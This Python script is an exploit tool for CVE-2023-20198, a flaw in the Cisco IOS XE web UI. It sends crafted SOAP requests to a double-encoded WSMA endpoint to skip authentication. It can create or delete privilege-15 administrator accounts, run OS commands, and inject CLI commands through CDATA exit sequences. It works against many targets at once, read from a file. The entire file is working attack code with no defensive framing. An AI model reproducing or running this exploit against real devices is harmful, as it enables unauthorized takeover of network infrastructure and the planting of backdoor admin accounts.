import re
import random
import string
import sys
import requests
import argparse
import xml.etree.ElementTree as ET
import urllib3

# 禁用 HTTPS 警告（如果目标是 https 但证书无效）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def GenerateRandTextAlpha(length):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(length))


def GetOutputResult(resp_text, cisco_method, exploit_mode):
    try:
        if exploit_mode == "user":
            return resp_text
        if cisco_method == "urn:cisco:wsma-exec":
            root = ET.fromstring(resp_text)
            namespaces = {"SOAP": "http://schemas.xmlsoap.org/soap/envelope/", "cisco": cisco_method}
            text_content = root.find('.//cisco:text', namespaces=namespaces)
            return text_content.text.strip() if text_content is not None else "No output"
        elif cisco_method == "urn:cisco:wsma-config":
            root = ET.fromstring(resp_text)
            namespaces = {"SOAP": "http://schemas.xmlsoap.org/soap/envelope/", "cisco": cisco_method}
            text_content = root.find('.//cisco:text', namespaces=namespaces)
            if text_content is None: return "No output"
            result = ""
            pattern = r"\*\*CLI Line # 2: (.*)"
            matches = re.findall(pattern, text_content.text.strip())
            for match in matches:
                result += match + "\n"
            return result
    except Exception:
        return "Error parsing XML"


def RunCliCommand(url, command, proxy, exploit_mode):
    # 自动识别和处理 URL 格式
    if "://" not in url:
        url = "http://" + url

    uri = "/%2577ebui_wsma_https" if url.startswith("https://") else "/%2577ebui_wsma_Http"
    target_url = url.rstrip('/') + uri

    exp_xml = f"""<?xml version="1.0"?>
    <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <SOAP:Header>
      <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
        <wsse:UsernameToken SOAP:mustUnderstand="false">
          <wsse:Username>{GenerateRandTextAlpha(4)}</wsse:Username>
          <wsse:Password>*****</wsse:Password>
        </wsse:UsernameToken>
      </wsse:Security>
    </SOAP:Header>
    <SOAP:Body>
      <request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-config">
        <configApply details="all" action-on-fail="continue">
          <config-data>
           <cli-config-data-block>{command}</cli-config-data-block>
          </config-data>
        </configApply>
      </request>
    </SOAP:Body>
</SOAP:Envelope>"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    try:
        response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
                                 proxies=proxy, timeout=10)
        if response.status_code == 200:
            return GetOutputResult(response.text, "urn:cisco:wsma-config", exploit_mode=exploit_mode)
    except:
        return None


def RunOSCommand(url, command, proxy):
    if "://" not in url:
        url = "http://" + url
    uri = "/%2577ebui_wsma_https" if url.startswith("https://") else "/%2577ebui_wsma_Http"
    target_url = url.rstrip('/') + uri

    exp_xml = f"""<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username> <wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>{command}</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    try:
        response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
                                 proxies=proxy, timeout=10)
        if response.status_code == 200:
            return GetOutputResult(response.text, "urn:cisco:wsma-exec", exploit_mode="cmd")
    except:
        return None


def ProcessTarget(url, args, proxy):
    print(f"\n[*] Testing target: {url}")
    if args.exploit_mode == "user":
        if args.del_user:
            res = RunCliCommand(url=url, command=f"no username {args.del_user} privilege 15", proxy=proxy,
                                exploit_mode="user")
            print(f"[+] Delete status for {args.del_user}: {'Success' if res and '<success' in res else 'Failed'}")
        else:
            username = args.add_user if args.add_user else GenerateRandTextAlpha(8)
            password = args.add_pass if args.add_pass else GenerateRandTextAlpha(8)
            res = RunCliCommand(url=url, command=f"username {username} privilege 15 secret {password}", proxy=proxy,
                                exploit_mode="user")
            if res and "<success" in res:
                print(f"[+] SUCCESS: Added {username} / {password}")
            else:
                print(f"[-] FAILED to add user.")

    elif args.exploit_mode == "cmd":
        if args.os_cmd:
            result = RunOSCommand(url=url, command=args.os_cmd, proxy=proxy)
            print(result if result else "[-] Command failed or no output.")
        if args.cli_cmd:
            pm = args.privilege_mode if args.privilege_mode else "privileged"
            cmd_payload = f"<![CDATA[exit\n{args.cli_cmd}]]>" if pm == "privileged" else f"<![CDATA[exit\nexit\n{args.cli_cmd}]]>"
            result = RunCliCommand(url=url, command=cmd_payload, proxy=proxy, exploit_mode="cmd")
            print(result if result else "[-] CLI command failed.")


def ParseArgs():
    parser = argparse.ArgumentParser(description="CVE-2023-20198-RCE Multi-Target")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", type=str, help="single target url")
    group.add_argument("-f", "--file", type=str, help="file containing target IPs/URLs (one per line)")

    parser.add_argument("-p", "--proxy", type=str, help="proxy url")
    parser.add_argument("-au", "--add-user", nargs="?", const="", help="username to add")
    parser.add_argument("-ap", "--add-pass", nargs="?", const="", help="password to add")
    parser.add_argument("-du", "--del-user", type=str, help="username to delete")
    parser.add_argument("-pm", "--privilege-mode", type=str, choices=['user', 'privileged'], help="cli privilege mode")
    parser.add_argument("-em", "--exploit-mode", type=str, choices=['user', 'cmd'], help="exploit mode", required=True)
    parser.add_argument("-oc", "--os-cmd", type=str, help="exec os command")
    parser.add_argument("-cc", "--cli-cmd", type=str, help="exec cli command")
    return parser.parse_args()


if __name__ == "__main__":
    args = ParseArgs()
    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    targets = []
    if args.url:
        targets.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[x] Error reading file: {e}")
            sys.exit(1)

    for t in targets:
        ProcessTarget(t, args, proxy)